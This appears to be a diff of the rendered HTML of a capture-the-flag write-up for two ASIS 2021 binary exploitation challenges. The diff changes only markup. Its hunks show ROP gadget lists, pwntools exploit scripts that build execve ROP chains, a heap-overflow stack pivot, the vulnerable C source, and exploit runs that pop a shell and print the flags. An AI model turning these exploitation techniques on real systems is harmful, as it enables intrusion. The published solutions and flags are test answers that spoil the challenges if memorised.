+<pre><code>00:0000│ rsp     0x7ffef03864e0 ◂— 0x0                                                                                                                                                         
 01:0008│         0x7ffef03864e8 —▸ 0x7ffef0386520 ◂— 0xb4                                                                                                                                      
 02:0010│         0x7ffef03864f0 ◂— 0x0                                                                                                                                                         
 03:0018│         0x7ffef03864f8 ◂— 0xfffffffe00403d3f /* '?=@' */                                                                                                                              
@@ -1901,14 +1901,14 @@ The binary is statically linked, and there is no system function in the binary, 
   >ROPgadget</a
 >.
 We got:</p>
-<pre tabindex="0"><code>0x0000000000406c32 : mov qword ptr [rax], rsi ; ret
+<pre><code>0x0000000000406c32 : mov qword ptr [rax], rsi ; ret
 0x0000000000401001 : pop rax ; ret
 0x00000000004019a3 : pop rsi ; ret
 0x00000000004013e9 : syscall
 0x0000000000403d23 : pop rdx ; ret
 0x0000000000401b0d : pop rdi ; ret
 </code></pre><p>Now we just have to craft the ropchain !</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">POP_RDI</span> <span class="o">=</span> <span class="mh">0x0000000000401b0d</span>
+<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="n">POP_RDI</span> <span class="o">=</span> <span class="mh">0x0000000000401b0d</span>
 <span class="n">POP_RDX</span> <span class="o">=</span> <span class="mh">0x0000000000403d23</span>
 <span class="n">SYSCALL</span> <span class="o">=</span> <span class="mh">0x00000000004013e9</span>
 <span class="n">POP_RAX</span> <span class="o">=</span> <span class="mh">0x0000000000401001</span>
@@ -1926,7 +1926,7 @@ We got:</p>
 <span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDX</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
 <span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
 </code></pre></div><p>And we can enjoy the shell !</p>
-<pre tabindex="0"><code>➜  justpwnit git:(master) ✗ python3 exploit.py HOST=168.119.108.148 PORT=11010
+<pre><code>➜  justpwnit git:(master) ✗ python3 exploit.py HOST=168.119.108.148 PORT=11010
 [*] '/home/nasm/pwn/asis2021/justpwnit/justpwnit'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
@@ -1950,7 +1950,7 @@ ASIS{p01nt_RSP_2_h34p!_RHP_1n5t34d_0f_RSP?}
         </a>
     </h2>
 </div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
+<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
 <span class="c1"># -*- coding: utf-8 -*-</span>
 
 <span class="c1"># this exploit was generated via</span>
@@ -1964,8 +1964,8 @@ ASIS{p01nt_RSP_2_h34p!_RHP_1n5t34d_0f_RSP?}
 
 <span class="c1"># Set up pwntools for the correct architecture</span>
 <span class="n">exe</span>  <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;justpwnit&#39;</span><span class="p">)</span>
-<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="kc">True</span>
-<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="kc">False</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="bp">True</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="bp">False</span>
 
 <span class="n">host</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">HOST</span>
 <span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">1337</span><span class="p">)</span>
@@ -2043,7 +2043,7 @@ ASIS{p01nt_RSP_2_h34p!_RHP_1n5t34d_0f_RSP?}
 </div>
 <p>abbr is very basic heap overflow, we just have to overwrite a function pointer to a stack pivot gadget with the help of a user controlled register. Then, we can drop a shell with a similar ROP as for the <code>justpwnit</code> challenge (the binary is also statically linked without the system function).</p>
 <p>Here is the source code:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
 </span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
 </span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
 </span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
@@ -2125,7 +2125,7 @@ ASIS{p01nt_RSP_2_h34p!_RHP_1n5t34d_0f_RSP?}
   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
 </code></pre></div><p>The <code>rules.h</code> looks like this:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
   <span class="kt">char</span> <span class="o">*</span><span class="n">a</span><span class="p">;</span> <span class="c1">// abbreviated string (i.e &#34;asap&#34;)
 </span><span class="c1"></span>  <span class="kt">char</span> <span class="o">*</span><span class="n">b</span><span class="p">;</span> <span class="c1">// expanded string (i.e &#34;as soon as possible&#34;)
 </span><span class="c1"></span><span class="p">}</span> <span class="n">Rule</span><span class="p">;</span>
@@ -2210,7 +2210,7 @@ So we send <code>b&quot;wwwwww&quot; + b&quot;A&quot;*(0x1000-16) + pwn.p64(gadg
 </div>
 <p>Once that&rsquo;s done, when the function pointer will be triggered at the next iteration, we will be able to jmp at an arbitrary location.
 Lets take a look at the values of the registers when we trigger the function pointer:</p>
-<pre tabindex="0"><code> RAX  0x1ee8bc0 —▸ 0x4018da (init_cacheinfo+234) ◂— pop    rdi
+<pre><code> RAX  0x1ee8bc0 —▸ 0x4018da (init_cacheinfo+234) ◂— pop    rdi
  RBX  0x400530 (_IO_getdelim.cold+29) ◂— 0x0
  RCX  0x459e62 (read+18) ◂— cmp    rax, -0x1000 /* 'H=' */
 *RDX  0x405121 (_nl_load_domain+737) ◂— xchg   eax, esp
@@ -2230,7 +2230,7 @@ Lets take a look at the values of the registers when we trigger the function poi
 </code></pre><p><code>$rax</code> points to the newly readen input, same for <code>$r8</code> and <code>$rdi</code> and <code>$rdx</code> contains the location to which we will jmp on.
 So we can search gadgets like <code>mov rsp, rax</code>, <code>mov rsp, rdi</code>, <code>mov rsp, r8</code> and so on. But I didn&rsquo;t find any gadgets like that, so I looked for <code>xchg rsp</code> gadgets, and I finally found a <code>xchg eax, esp</code> gadgets ! Since the binary is not PIE based, the heap addresses fit into a 32 bits register, so that&rsquo;s perfect!</p>
 <p>Now we can make <code>$rsp</code> to point to the user input, we make a similar ropchain as the last challenge, and that&rsquo;s enough to get a shell!</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py">
+<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py">
 <span class="c1"># 0x00000000004126e3 : call qword ptr [rax]</span>
 <span class="c1"># 0x0000000000485fd2 : xchg eax, ebp ; ret</span>
 <span class="c1"># 0x0000000000405121 : xchg eax, esp ; ret</span>
@@ -2266,7 +2266,7 @@ So we can search gadgets like <code>mov rsp, rax</code>, <code>mov rsp, rdi</cod
 <span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">)</span>
 <span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
 </code></pre></div><p>We launch the script with the right arguments and we correctly pop a shell!</p>
-<pre tabindex="0"><code>➜  abbr.d git:(master) ✗ python3 exploit.py HOST=168.119.108.148 PORT=10010 
+<pre><code>➜  abbr.d git:(master) ✗ python3 exploit.py HOST=168.119.108.148 PORT=10010 
 [*] '/home/nasm/pwn/asis2021/abbr.d/abbr'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
@@ -2292,7 +2292,7 @@ ASIS{d1d_u_kn0w_ASIS_1s_n0t_4n_4bbr3v14t10n}
         </a>
     </h2>
 </div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
+<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
 <span class="c1"># -*- coding: utf-8 -*-</span>
 
 <span class="c1"># this exploit was generated via</span>
@@ -2306,8 +2306,8 @@ ASIS{d1d_u_kn0w_ASIS_1s_n0t_4n_4bbr3v14t10n}
 
 <span class="c1"># Set up pwntools for the correct architecture</span>
 <span class="n">exe</span>  <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;abbr&#39;</span><span class="p">)</span>
-<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="kc">True</span>
-<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="kc">False</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="bp">True</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="bp">False</span>
 
 <span class="n">host</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">HOST</span> <span class="ow">or</span> <span class="s1">&#39;127.0.0.1&#39;</span>
 <span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">1337</span><span class="p">)</span>
